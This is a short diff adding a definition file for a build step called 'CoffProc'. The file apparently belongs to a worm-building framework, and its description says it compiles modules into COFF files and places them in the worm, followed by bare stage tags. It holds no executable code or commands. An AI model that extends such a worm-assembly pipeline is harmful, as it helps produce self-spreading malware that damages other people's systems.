@@ -1,0 +1,10 @@
+#!name##CoffProc
+#!itemType##Wprocess
+#!info##Builds libraries, turns modules into COFF files and places them in the worm.
+
+[PAYLOAD]
+[BUILD_LIB]
+[BUILD_COFF]
+[BUILD_CODE]
+[COMPILE]
+[DONE]
